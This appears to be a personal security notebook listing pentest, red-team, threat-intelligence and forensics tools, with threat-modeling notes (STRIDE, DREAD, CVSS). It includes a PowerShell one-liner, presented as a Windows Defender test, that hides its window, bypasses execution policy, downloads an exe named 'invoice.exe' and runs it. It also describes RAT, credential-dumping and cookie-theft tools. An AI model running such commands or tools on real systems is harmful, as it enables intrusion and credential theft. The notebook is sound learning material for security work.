Empire 3.0 is a post-exploitation framework that includes a pure-PowerShell 2.0 Windows agent, and compatibility with Python 2.x/3.x Linux/OS X agents. It is the merger of the previous PowerShell Empire and Python EmPyre projects. The framework offers cryptologically-secure communications and a flexible architecture. On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework. PowerShell Empire premiered at BSidesLV in 2015 and Python EmPyre premeiered at HackMiami 2016. BC-Security presented updates to further evade Microsoft Antimalware Scan Interface (AMSI) and JA3/S signatures at DEF CON 27.

Empire relies heavily on the work from several other projects for its underlying functionality. We have tried to call out a few of those people we've interacted with heavily here and have included author/reference link information in the source of each Empire module as appropriate. If we have failed to properly cite existing or prior work, please let us know at Empire@BC-Security.org.

Empire is developed by @harmj0y, @sixdub, @enigma0x3, @rvrsh3ll, @killswitch_gui, @xorrior, and @bcsecurity1. While the main fork for Empire is no longer maintained, this fork is maintained by BC-Security and will continue to receive periodic updates.

https://github.com/BC-SECURITY/Empire/ 

===== Ettercap

===== Exiftool
Shows exif data about a file.   To ensure you get the correct date time meta data, always use wget.

===== Eyewitness

===== Evilarc
evilarc.py is an archiving tool that allows for folder manipulation.

===== FatRat
TheFatRat by Edo Maland, is a massive exploiting tool which compiles a malware with famous payloads, generate backdoor that allows easy post exploitation attacks such as browser attacks etc.. and then the compiled maware can be executed on Linux , Windows , Mac and Android. TheFatRat Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.

Link: https://www.blackhatethicalhacking.com/tools/thefatrat/


===== Ghidra
Ghidra is a software reverse engineering (SRE) framework created and maintained by the National Security Agency Research Directorate. This framework includes a suite of full-featured, high-end software analysis tools that enable users to analyze compiled code on a variety of platforms including Windows, macOS, and Linux. Capabilities include disassembly, assembly, decompilation, graphing, and scripting, along with hundreds of other features. Ghidra supports a wide variety of processor instruction sets and executable formats and can be run in both user-interactive and automated modes. Users may also develop their own Ghidra plug-in components and/or scripts using Java or Python.
Link: https://ghidra-sre.org/

===== Gitleaks

Link: https://github.com/zricethezav/gitleaks

===== Gobuster

Gobuster is a tool used to brute-force:

* URIs (directories and files) in web sites.
* DNS subdomains (with wildcard support).

Install

	sudo apt-get install gobuster

Usage

Scan a website (-u http://192.168.0.155/) for directories using a wordlist (-w /usr/share/wordlists/dirb/common.txt) and print the full URLs of discovered paths (-e):

	*Using dirb word lists* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt -o filename.txt
	*Using dirbuster word lists* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirbuster/directgory-list-2.3-medium.txt -o filename.txt
	*Using a cookie* gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirbuster/directgory-list-2.3-medium.txt -o filename.txt -c 'cookievariable=valie'


[horizontal]
Source:: https://github.com/OJ/gobuster
Author:: OJ Reeves
License:: Apache-2.0
Syntax:: gobuster dir -u http://<site-name or IP address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirbust-root.log

===== Hashcat

===== HTTPROBE
[horizontal]
Github:: https://github.com/tomnomnom/httprobe
Perform a scan on specific ports:: cat domains.txt | httprobe -s -p https:8443


===== Hydra

===== Impacket-secretsdump

===== JQ
jq is like sed for JSON data - you can use it to slice and filter and map and transform structured data with the same ease that sed, awk, grep and friends let you play with text.

jq is written in portable C, and it has zero runtime dependencies. You can download a single binary, scp it to a far away machine of the same type, and expect it to work.

jq can mangle the data format that you have into the one that you want with very little effort, and the program to do so is often shorter and simpler than you’d expect.

More information here: https://stedolan.github.io/jq/

===== Kali Linux

[horizontal]
Install ntpdate package:: sudo apt-get install ntpdate
Sync date & time with ntp source:: sudo ntpdate in.pool.ntp.org
Install all the tools on Kali:: sudo apt-get install kali-linux-full
Kali Tools Listing:: https://en.kali.tools/all/
Update Kali:: sudo apt-get update; sudo apt-get dist-upgrade;sudo apt-get clean

===== LinEnum
Linux enumeration & privilege escalation checks

Link: https://github.com/rebootuser/LinEnum



===== Mentalist
Mentalist is a graphical tool for custom wordlist generation. It utilizes common human paradigms for constructing passwords and can output the full wordlist as well as rules compatible with Hashcat and John the Ripper.
Link: https://github.com/sc0tfree/mentalist/blob/master/README.md

===== Metasploit

[horizontal]
On Kali metasploit is in this directory:: /usr/share/metssploit-framework
To Update metasploit:: apt update; apt install metasploit-framework
Metasploit Online Database:: https://www.rapid7.com/db/modules

===== Mimikatz
Mimikatz is a leading post-exploitation tool that dumps passwords from memory, as well as hashes, PINs and Kerberos tickets. Other useful attacks it enables are pass-the-hash, pass-the-ticket or building Golden Kerberos tickets. This makes post-exploitation lateral movement within a network easy for attackers.

Link: https://github.com/gentilkiwi/mimikatz



===== Nikto
Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.

Nikto is not designed as a stealthy tool. It will test a web server in the quickest time possible, and is obvious in log files or to an IPS/IDS. However, there is support for LibWhisker's anti-IDS methods in case you want to give it a try (or test your IDS system).


Not every check is a security problem, though most are. There are some items that are "info only" type checks that look for things that may not have a security flaw, but the webmaster or security engineer may not know are present on the server. These items are usually marked appropriately in the information printed. There are also some checks for unknown items which have been seen scanned for in log files.

https://cirt.net/Nikto2 

===== Powershell Empire
Empire has an inbuilt listener named http_hop which allows us to redirect our traffic to one of our another active listener after getting an agent. Thus, the name hop as it hops the agent from one listener to another in order to redirect traffic.

Similar to Metasploit, the hop listener in empire uses a hop.php file. When you activate the hop listener, it will generate three PHP files that will redirect your existing listener. Place the said files in your jump server (ubuntu) and then set up your stager in according to get the session through the mediator i.e. our hop listener.
Link: https://www.hackingarticles.in/hiding-ip-during-pentest-using-powershell-empire-http_hop/

===== Pupy
Pupy is a cross-platform, post exploitation tool as well as a multi-function RAT. It’s written in python which makes it very convenient. It also has low detectability that’s why it’s a great tool for the red team.  Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory.

It uses a reflected DLL to load python interpreter from memory which is great as nothing will be shown in the disk. It doesn’t have any special dependencies. It can also migrate into other processes. The communication protocols of pupy are modular and stackable. It can execute non-interactive commands on multiple hosts at once. All the interactive shells can be accessed remotely.
Link: https://www.hackingarticles.in/command-control-tool-pupy/

===== Responder
This tool is first an LLMNR and NBT-NS responder, it will answer to *specific* NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answers to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don’t break legitimate NBT-NS behavior. You can set the -r option to 1 via command line if you want this tool to answer to the Workstation Service request name suffix.

Usage Example
Specify the IP address to redirect to (-i 192.168.1.202), enabling the WPAD rogue proxy (-w On), answers for netbios wredir (-r On), and fingerprinting (-f On):

	responder -i 192.168.1.202 -w On -r On -f On

===== Sbmclient

===== Sharp Cookie Monster

If you steal a users Chrome cookie, you can log into their accounts on every website they are logged into.

Normally you need the user’s password to do it, @mangopdf found a way to do it without the password. You just need to be able to execute code on their computer. It works by using Chrome’s Remote Debugging Protocol

This tool is based on Cookie Crimes module: https://github.com/defaultnamehere/cookie_crimes 

Link: https://www.blackhatethicalhacking.com/tools/sharp-cookie-monster/

===== Smbmap

===== SSLStrip

===== Sublist3r

Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.

*Installation*
. Login as root
. Open a terminal session
. Change directory to /opt

	cd /opt

. Download the latest version from git

	git clone https://github.com/aboul3la/Sublist3r.git

. Change the directory to Sublist3r:

	cd Sublist3r

. Install the required dependencies:

	pip install -r requirements.txt

. Execute the sublist3r

	python sublist3r -h
	or
	./sublist3r.py -h 

[horizontal]
Source:: https://github.com/aboul3la/Sublist3r
Author:: Ahmed Aboul-Ela
License:: GPL-2+

===== TheHarvester

===== Tokenvator
A Tool to Elevate Privilege using Windows Tokens

Link: https://blog.netspi.com/tokenvator-a-tool-to-elevate-privilege-using-windows-tokens/

===== TruffleHog

Link: https://github.com/dxa4481/truffleHog

===== Wfuzz
Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.

[horizontal]
Source:: https://github.com/xmendez/wfuzz/
Author:: Christian Martorella, Carlos del ojo, Xavier Mendez aka Javi
License:: GPLv2

===== Yara


==== Red team Assessment
A Red Team Assessment is similar to a penetration test in many ways but is more targeted. The goal of the Red Team Assessment is NOT to find as many vulnerabilities as possible. The goal is to test the organization's detection and response capabilities. The red team will try to get in and access sensitive information in any way possible, as quietly as possible. The Red Team Assessment emulates a malicious actor targeting attacks and looking to avoid detection, similar to an Advanced Persistent Threat (APT). (Ugh! I said it…) Red Team Assessments are also normally longer in duration than Penetration Tests. A Penetration Test often takes place over 1-2 weeks, whereas a Red Team Assessment could be over 3-4 weeks or longer, and often consists of multiple people.

A Red Team Assessment does not look for multiple vulnerabilities but for those vulnerabilities that will achieve their goals. The goals are often the same as the Penetration Test. Methods used during a Red Team Assessment include Social Engineering (Physical and Electronic), Wireless, External, and more. A Red Team Assessment is NOT for everyone though and should be performed by organizations with mature security programs. These are organizations that often have penetration tests done, have patched most vulnerabilities, and have generally positive penetration test results.

The Red Team Assessment might consist of the following:

A member of the Red Team poses as a Fed-Ex delivery driver and accesses the building. Once inside, the Team member plants a device on the network for easy remote access. This device tunnels out using a common port allowed outbound, such as port 80, 443, or 53 (HTTP, HTTPS, or DNS), and establishes a command and control (C2) channel to the Red Team's servers. Another Team member picks up the C2 channel and pivots around the network, possibly using insecure printers or other devices that will take the sights off the device placed. The Team members then pivot around the network until they reach their goal, taking their time to avoid detection.

This is just one of innumerable methods a Red Team may operate but is a good example of some tests we have performed.

* Offensive Security
* Ethical Hacking
* Exploiting Vulnerabilities
* Penetration Testing
* Black Box Testing
* Social Engineering
* Web App Scanning

===== Red Team Resources

. https://www.hackingarticles.in/red-teaming/ 

====== Remote Access Trojan (RAT)
Link: https://github.com/b4rtik/RedPeanut


==== Blue Team Assessment
Blue team assessment is usually a test of the teams' ability to identify and defend the network while under attack by the Red Teams/Penetration Tester/Hacker.

* Defensive Security
* Infrastructure Protection
* Damage Control
* Incident Response
* Operational Security
* Threat Hunters
* Digital Forensics

===== Powershell to test Windows Defender

	powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'

==== Purple Team
* Collaborative Security
* Reand & Blue Teams Function Together
* Cooperate to improve/test detection
* Vulnerability Scanning & Pen Testing

==== Methods
social engineering, phishing, vishing or simply posing as a company employee.

=== Threat Modeling
Threat modeling is a process by which potential threats, such as structural vulnerabilities can be identified, enumerated, and prioritized – all from a hypothetical attacker’s point of view. The purpose of threat modeling is to provide defenders with a systematic analysis of the probable attacker’s profile, the most likely attack vectors, and the assets most desired by an attacker. Threat modeling answers the questions “Where are the high-value assets?” “Where am I most vulnerable to attack?” “What are the most relevant threats?” “Is there an attack vector that might go unnoticed?

It is a structured approach that enables you to identify, quantify, and address the security risks associated with an application. Threat modeling is not an approach to reviewing code, but it does complement the security code review process.

Some great information here  https://www.threatmodelingmanifesto.org/[Threat Modeling Manifesto]

==== CVSS
CVSS stands for Common Vulnerability Scoring System, which provides a score to indicate the severity of the CVE vulnerabilities.

Assignment of a CVSS score is based on:

* The primary impact on the confidentiality, integrity, and availability of the protected system/resources
* The derivative impact on loss of life and/or properties
* The percentage of the impacted area within the total environment
* How easy it is to exploit the vulnerability
* How easy it is to remediate the vulnerability
* How confident the testing team is about the existence of the vulnerability

==== NVD
National Vulnerability Database (NVD) is the U.S. government repository of standards based vulnerability management data. NVD also provides severity rankings of "Low," "Medium," and "High" in addition to the numeric CVSS scores. These qualitative rankings are simply mapped from the numeric CVSS scores:

* Vulnerabilities are labeled "Low" severity if they have a CVSS base score of 0.0-3.9.
* Vulnerabilities will be labeled "Medium" severity if they have a base CVSS score of 4.0-6.9.
* Vulnerabilities will be labeled "High" severity if they have a CVSS base score of 7.0-10.0

==== STRIDE
STRIDE is a model of threats developed by Praerit Garg and Loren Kohnfelder at Microsoft[1] for identifying computer security threats.[2] It provides a mnemonic for security threats in six categories.[3]

The threats are:

* **S**poofing of user identity
* **T**ampering
* **R**epudiation
* **I**nformation disclosure (privacy breach or data leak)
* **D**enial of service (D.o.S)
* **E**levation of privilege.

==== DREAD
DREAD methodology is used to rate, compare and prioritize the severity of risk presented by each threat that is classified using STRIDE.

* **D**amage
* **R**eproducibility
* **E**xploitability
* **A**ffected Users
* **D**iscoverability

DREAD Risk = (Damage + Reproduciblity + Exploitability + Affected Users + Discoverability) / 5. Calculation always produces a number between 0 and 10. Higher the number means more serious the risk is.

Following is a customized mathematical approach to implement DREAD methodology:-

*Damage Potential*
If a threat exploit occurs, how much damage will be caused?

* 0 = Nothing
* 5 = Information disclosure that could be used in combination with other vulnerabilities
* 8 = Individual/employer non sensitive user data is compromised.
* 9 = Administrative non sensitive data is compromised.
* 10 = Complete system or data destruction.
* 10 = Application unavailability.

*Reproducible*
How easy is it to reproduce the threat exploit?

* 0 = Very hard or impossible, even for administrators of the application.
* 5 = Complex steps are required for authorized user.
* 7.5 = Easy steps for Authenticated user
* 10 = Just a web browser and the address bar is sufficient, without authentication.

*Exploit-ability*
What is needed to exploit this threat?

* 2.5 = Advanced programming and networking knowledge, with custom or advanced attack tools.
* 5 = Exploit exits in public, using available attack tools.
* 9 = A Web Application Proxy tool
* 10 = Just a web browser

*Affected Users*
How many users will be affected?

* 0 = None
* 2.5 individual/employer that is already compromised.
* 6 = some users of individual or employer privileges, but not all.
* 8 = Administrative users
* 10 = All users

*Discover-ability*
How easy is it to discover this threat?

* 0 = Very hard requires source code or administrative access.
* 5 = Can figure it out by monitoring and manipulating HTTP requests
* 8 = Details of faults like this are already in the public domain and can be easily discovered using a search engine.
* 10 = the information is visible in the web browser address bar or in a form.

DREAD methodology can be customized to cater the needs of your application, during consultancy engagements it should be approved from the client before starting the security assessment so that after you perform the analysis the results produced by DREAD couldn’t be challenged.

=== Threat Intelligence
This is the key methodology that every cyber security practictioner should be familiar with.  It ensures that one stays in sync with all the activites of threat actors and use that information to proactively protect their environments.

==== Search Engines

===== IoT



==== Threat Exchanges


==== MITRE ATT&CK
https://attack.mitre.org/[MITRE ATT&CK™] is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cyber security product and service community.

With the creation of ATT&CK, MITRE is fulfilling its mission to solve problems for a safer world — by bringing communities together to develop more effective cybersecurity. ATT&CK is open and available to any person or organization for use at no charge.

==== Open Threat Exchange(OTX)

==== Palo Alto Unit42
Unit 42 is the global threat intelligence team at Palo Alto Networks®

.. Palo Alto Unit42 website: https://unit42.paloaltonetworks.com/ 
.. Playbook: https://pan-unit42.github.io/playbook_viewer/ 

https://www.packetstormsecurity.com
https://www.securityfocus.com
https://www.exploit-db.com

==== Cisco Talos
Cisco Talos Intelligence Group is one of the largest commercial threat intelligence teams in the world, comprised of world-class researchers, analysits and engineers.  These teams are supposed by unrivaled telemetry and sophisticated systems to create accurate, rapid and actionable threat intelligence for Cisco Customers, products and services.  Talos defends Cisco customers against knowns and emerging threats, discovers new vulnerabilities in common software, and interdicts threats in the wild beofre they can further harm the internet at large.  Talos maintains the official rules sets of Snort.org, ClamAV, and SpanCop, in addition to releasing many open-source research and analysis tools.

Talos was formed by combining SourceFire's Vulnerability Research Team, the Cisco Threat Research and Communications group, and the Cisco Security Applications Group.  The combined expertise is backed by a sophisticated infrastrucutre, and Cisco's unrivaled telemetry of data that spans across networks, endpoints, cloud environments, virtual systems, and daily web and email traffic.

Link: https://talosintelligence.com/ 

==== Sophos Labs


Link: https://www.sophos.com/en-us/labs.aspx 

==== STIX
STIX (Structured Threat Information eXpression) was originally conceived as a language to describe cyber threat intelligence. This was groundbreaking at the time because it was the first language to provide a definition of cyber threat intelligence. Although it’s a bit of a fuzzy term, cyber threat intelligence generally describes information about adversaries and their behaviors that can inform defensive actions. For example, knowing that a certain adversary targets financial institutions by using specially crafted spear-phishing emails, and then delivers Trojans that will reach out to a certain set of websites that are known to be malicious, can be very helpful in defending against the attack. STIX captures that type of intelligence in a machine-readable form so that it can be shared among organizations and tools.

The DHS Office of Cybersecurity and Communications funded MITRE, beginning in 2012, to act as the technical developer of STIX and serve as a community facilitator to jumpstart STIX. Once some level of maturity was reached, STIX would be transitioned to an international standards body. That goal was realized in 2015 when governance of STIX was transitioned to OASIS, an international standards consortium. This was a big step for STIX and a big success for DHS, MITRE, and the community because it meant that STIX was on its way to becoming an international standard. Although DHS and MITRE continue to serve in several leadership positions in the CTI TC, the majority of the leadership and the vast majority of participants in the TC are from industry. In fact, the OASIS CTI TC was founded with more participants than any other TC in OASIS history. It's that community that led the development of STIX 2.0.

==== TAXII
TAXII is a high-level protocol for moving cyber threat intelligence (primarily STIX) data around between systems and tools. We expect that, within the coming months, TAXII will be achieving this same milestone and opening its own public review period.

If you're interested in learning more about STIX 2.0 or TAXII 2.0, the documentation page is the best place to start.

==== Tools

===== MISP
MISP - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing

Link: https://www.misp-project.org/

=== Threat Hunting
Threat hunting is a relatively new focal area in information security.  Actively looking for C2C in your environment.  Firewalls, IDS/IPS, SIEM are not able to detect C2C.

*Beacons*
Looking for persistent outbound signal
* Is there consistency in timing
* 

==== Sysmon
Microsoft Sysinternals Sysmon configuration repository, set up modular for easier maintenance and generation of specific configs.
link: https://github.com/olafhartong/sysmon-modular

==== Detecting C2 over DNS
* Capture all DNS traffic
** Capture tool of your choice
** Longer the capture time, the better
* Filter so it is DNS traffic only
* Extract to text so we can sort and count
* Review total FQDNs per domain
* Check domain with a lot of FQDNs

==== RITA

Link: https://www.activecountermeasures.com/free-tools/rita/ 

==== Tshark
	tshark -q -z conv,ip -r dnscat2.pcapng | tr -s ' ' | cut -d " " -f 1,2,3,10 | sort -k 4 -rn | head 
	
	tshark -r thunt-lab.pcapng -T fields -e dns.qry.name | sort |uniq | rev | cut -d '.' -f 1-2 |rev | uniq -c | sort -rn | head -10

==== Zeek
Network sniffing tool, formerly called Bro.


==== Reference Sites
. https://pentestmag.com/using-the-mitre-attck-navigator-for-intelligence-gathering-pre-purple-teaming/
. https://www.activecountermeasures.com/raspberry_pi_sensor/
. https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClarCAC
. https://gist.github.com/MSAdministrator/7a61025263e279a740835da4b205e6d0
. https://www.twistlock.com/2019/01/02/whitelisting-blacklisting-security-strategy/
. https://en.wikipedia.org/wiki/Domain_fronting
. https://www.bleepingcomputer.com/news/security/teamviewer-confirms-undisclosed-breach-from-2016/
. https://www.linkedin.com/posts/kirtaroza_cyberthreatintelligence-note-paython-activity-6600672896148959232-J-r8/
. https://github.com/activecm/passer
. http://www.stearns.org/doc/pcap-apps.html
. HELKS
. SELKS
. Packet Squirrel https://shop.hak5.org/products/packet-squirrel
. https://register.gotowebinar.com/register/2540509980495221261?source=ACMtwitter
. netgear gs305e

=== Threat Risk Assessments
*Threat*: Any potential actor that has the capability, motivation, or intent to exploit a vulnerability.
Vulnerability: Is a weakness that allows a threat to compromise the security of a system.

*Risk*: Likelihood of a threat source to exploit a vulnerability to target a critical asset and impact a business negatively.
Controls, safeguards, countermeasures are implemented to reduce the risk.

=== Bug Bounty / Crowsourced Security Platforms
. Hackerone
. Bugcrowd
. Synack
. Detectify
. cobalt
. Open Bug Bounty
. Zerocopter
. YesWeHack
. HackenProof
. Vulnerability Lab
. FireBounty
. BugBounty.jp
. AntiHACK
. Intigriti
. SafeHats
. RedStorm
. Cyber Army ID
. Yogosha

<<<
== Digital Forensics & Incident Response

=== Preparation
. Never use flow charts for incident response
. Know your tools, practise, practise, practise
. Have procedures on when and how to use your tools
. There are differences on how to respond to an incident based on based on environment, hence ensure you are familiar with the environment and know which tools to use.  Some to of environments are:
.. On Premise
.. Azure
.. GCP
.. AWS
.. Other cloud provider

=== During the Incident
. Secure the impacted environment to ensure no one but Incident Responders only
. Document every activity during the incident in a log to ensure you have a timeline
. Dump the memory using following tools(this is not an exhaustive list):
.. PMEM
.. FTKIMAGER
. Decide which logs do you need to conduct your analysis, for example:
.. Active Directory Logs if you are an AD Shop, 99% environments today are.
.. File Server Logs
.. Web Server Logs
.. Application Server Logs
.. Database Server Logs
.. Firewall Logs
.. Switch Logs
.. Router Logs
.. Access Point Logs

==== Windows Persistence
Focus on System & Security logs.  Standard artifact utilized in any investigation.

Following log types are important:

. Task logs 
. Events concerning services
.. 7045 - Code for new service installed, should be a low frequency event.
.. 7009 - Service failed to start, what should be running and is not.
.. 7035/7036 - Services being tampered with for malicious purposes. Look for services that have no descrption, and have image path that is in a non standard directory.  DLL is in the same directory as exe, which is a side loading technique. Check for start type, if it is changed to 2, which is auto start. Type 10 means that the service is running under user account authority.
.. 601 - Attempt to install a service
.. 7034 - Service has crashed unexpectedly
. Events concerning schedules tasks
.. 4698 - When a scheduled task is created on a system that has been compromised
.. 4702 - When a scheduled task has been altered
.. 4701/4699 
.. 4700 - A scheduled task has been enabled.

Scheduled tasks with abnormal names or directories.  Attackers usually create a verly long task name.  Check the command syntax.

=== System Tools

==== References
. https://holisticinfosec.io/post/deepbluecli/[DeepBlueCLI: Powershell Threat Hunting]
. https://www.netscylla.com/blog/2020/02/01/Threat-hunting-with-Windows-Event-Logs.html[Threat Hunting with Windows Event Logs & Sysmon]

==== Autollr
AutoLLR is a live Linux evidence collection script that gathers key artifacts important for Incident Response investigations. In addition to gathering artifacts AutoLLR does some low overhead post processing to produce refined results that analysts can look at immediately.

Github: https://github.com/Dead-Simple-Scripts/AutoLLR 

Dead Simple Scripts: http://github.com/Dead-Simple-Scripts 

==== Autopsy
Autopsy® is the premier end-to-end open source digital forensics platform. Built by Basis Technology with the core features you expect in commercial forensic tools, Autopsy is a fast, thorough, and efficient hard drive investigation solution that evolves with your needs.

https://www.autopsy.com/

==== Bluegate
Proof of Concept (Denial of Service + scanner) for CVE-2020-0609 and CVE-2020-0610.

These vulnerabilities allows an unauthenticated attacker to gain remote code execution with highest privileges via RD Gateway for RDP.

Please use for research and educational purpose only.
Link: https://github.com/ollypwn/BlueGate

==== Bulk-extractor
It is a program that extracts features such as email addresses, credit card numbers, URLs, and other types of information from digital evidence files. It is a useful forensic investigation tool for many tasks such as malware and intrusion investigations, identity investigations and cyber investigations, as well as analyzing imagery and pass-word cracking. The program provides several unusual capabilities including:

* It finds email addresses, URLs and credit card numbers that other tools miss because it can process compressed data (like ZIP, PDF and GZIP ﬁles) and incomplete or partially corrupted data. It can carve JPEGs, office documents and other kinds of files out of fragments of compressed data. It will detect and carve encrypted RAR files.
* It builds word lists based on all of the words found within the data, even those in compressed files that are in unallocated space. Those word lists can be useful for password cracking.
* It is multi-threaded; running bulk_extractor on a computer with twice the number of cores typically makes it complete a run in half the time.
* It creates histograms showing the most common email addresses, URLs, domains, search terms and other kinds of information on the drive.

Link: https://tools.kali.org/forensics/bulk-extractor

==== Cortex
https://github.com/TheHive-Project/Cortex/[Cortex] tries to solve a common problem frequently encountered by SOCs, CSIRTs and security researchers in the course of threat intelligence, digital forensics and incident response: how to analyze observables they have collected, at scale, by querying a single tool instead of several?

Cortex, an open source and free software, has been created by TheHive Project for this very purpose. Observables, such as IP and email addresses, URLs, domain names, files or hashes, can be analyzed one by one or in bulk mode using a Web interface. Analysts can also automate these operations thanks to the Cortex REST API.

==== Cuckoo
https://cuckoosandbox.org/[Cuckoo] Sandbox is the leading open source automated malware analysis system.You can throw any suspicious file at it and in a matter of minutes Cuckoo will provide a detailed report outlining the behavior of the file when executed inside a realistic but isolated environment.

Malware is the swiss-army knife of cybercriminals and any other adversary to your corporation or organization.

In these evolving times, detecting and removing malware artifacts is not enough: it's vitally important to understand how they operate in order to understand the context, the motivations, and the goals of a breach.

Cuckoo Sandbox is free software that automated the task of analyzing any malicious file under Windows, macOS, Linux, and Android.

==== DeepBlueCLI
https://github.com/sans-blue-team/DeepBlueCLI[DeepBlueCLI] is a PowerShell Module for Threat Hunting via Windows Event Logs.

==== DensityScout
DensityScout is a tool that has been written for one purpose: finding (possibly unknown) malware on a potentially infected system. Therefore it takes advantage of the typical approach of malware authors to protect their "products" with obfuscation like run-time-packing and -encryption. The tool itself is based on the concept of our Bytehist tool, btw.

*So what does DensityScout do?*
DensityScout's main focus is to scan a desired file-system-path by calculating the density of each file to finally print out an accordingly descending list. Usually most Microsoft Windows executables are not packed or encrypted in any way which throws the hits of malicious executables to the top of the list where one can easily focus on.

*What's Density?*
Density can also be understood as "entropy". However, the algorithm behind density is not 100% equal to the one which entropy is based on. So we decided to choose a different name.

Link: https://www.cert.at/downloads/software/densityscout_en.html

==== DNSTwist
https://www.blackhatethicalhacking.com/tools/dnstwist/[dnstwist] takes in your domain name as a seed, generates a list of potential phishing domains and then checks to see if they are registered. Additionally it can test if the mail server from MX record can be used to intercept misdirected corporate e-mails and it can generate fuzzy hashes of the web pages to see if they are live phishing sites.

==== First Incident Response
https://github.com/certsocietegenerale/FIR[FIR] (Fast Incident Response) is an cybersecurity incident management platform designed with agility and speed in mind. It allows for easy creation, tracking, and reporting of cybersecurity incidents.

FIR is for anyone needing to track cybersecurity incidents (CSIRTs, CERTs, SOCs, etc.). It was tailored to suit our needs and our team's habits, but we put a great deal of effort into making it as generic as possible before releasing it so that other teams around the world may also use it and customize it as they see fit.

==== Kape
KAPE is a multi-function program that primarily: 

. collects files
. processes collected files with one or more programs.

KAPE reads configuration files on the fly and based on their contents, collects and processes relevant files. This makes KAPE very extensible in that the program’s author does not need to be involved to add or expand functionality.

As we will see later in more detail, KAPE uses the concepts of targets and modules to do its work. KAPE comes with a range of default targets and modules for operations most commonly required in forensic exams. These can also serve as models  for creating new targets and modules.

At a high level, KAPE works by adding file masks to a queue. This queue is then used to find and copy files from a source location. For files that are locked by the operating system, a second run bypasses the lock. At the end of the process, KAPE will make a copy and preserve metadata about all available files from a source location into a given directory. The second (optional) stage of processing is to run one or more programs against the collected data. This too works by targeting either specific file names or directories. Various programs are run against the files, and the output from the programs is then saved in directories named after a category, such as EvidenceOfExecution, BrowserHistory or AccountUsage.

By grouping things by category, examiners of all skill levels have the means to discover relevant information regardless of an individual artifact's source. In other words, an examiner no longer need to know how to process prefetch, shimcache, amcache, userassist, etc., as they relate to evidence of execution artifacts. Ultimately, a wider range of artifacts can be leveraged for any given requirement.

Link: https://www.kroll.com/en/insights/publications/cyber/kroll-artifact-parser-extractor-kape

==== LogonTracer
https://github.com/JPCERTCC/LogonTracer[LogonTracer] is a tool to investigate malicious logon by visualizing and analyzing Windows Active Directory event logs. This tool associates a host name (or an IP address) and account name found in logon-related events and displays it as a graph. This way, it is possible to see in which account login attempt occurs and which host is used.
This tool can visualize the following event id related to Windows logon based on https://www.first.org/resources/papers/conf2016/FIRST-2016-105.pdf[this research].

* 4624: Successful logon
* 4625: Logon failure
* 4768: Kerberos Authentication (TGT Request)
* 4769: Kerberos Service Ticket (ST Request)
* 4776: NTLM Authentication
* 4672: Assign special privileges

==== Loki
LOKI Free IOC Scanner: http://www.nextron-systems.com/loki/ 

Loki Github: http://github.com/Neo23x0/Loki

Automating APT Scanning with Loki Scanner and Splunk: http://www.redblue.team/2017/04/automating-apt-scanning-with-loki.html

==== Red Ripper
When you an image file, load them into red ripper.  Has plugins that you can run against a registry hive.

==== Rekall
http://www.rekall-forensic.com/[Rekall] is an advanced forensic and incident response framework. While it began life purely as a memory forensic framework, it has now evolved into a complete platform.  Rekall implements the most advanced analysis techniques in the field, while still being developed in the open, with a free and open source license. Many of the innovations implemented within Rekall have been published in http://www.rekall-forensic.com/documentation-1/publications[peer reviewed papers] .  

Rekall provides an end-to-end solution to incident responders and forensic analysts. From state of the art acquisition tools, to the most advanced open source memory analysis framework. http://www.rekall-forensic.com/documentation-1/rekall-documentation/rekall-at-a-glance[Rekall at a glance].

==== Rsync
Last ditch collection tool.  

==== Sharpchromium
https://www.blackhatethicalhacking.com/tools/sharp-chromium/

==== SIFT Workstation
The https://digital-forensics.sans.org/community/downloads[SIFT] Workstation is a group of free open-source incident response and forensic tools designed to perform detailed digital forensic examinations in a variety of settings. It can match any current incident response and forensic tool suite. SIFT demonstrates that advanced incident response capabilities and deep dive digital forensic techniques to intrusions can be accomplished using cutting-edge open-source tools that are freely available and frequently updated.

==== Sysmon
A windows system driver that captures events and sends them to eventlog. It can be downloaded from sysinternals website. 

. https://github.com/SwiftOnSecurity/[Swift on Security Sysmon Config file]

==== The Hive Project
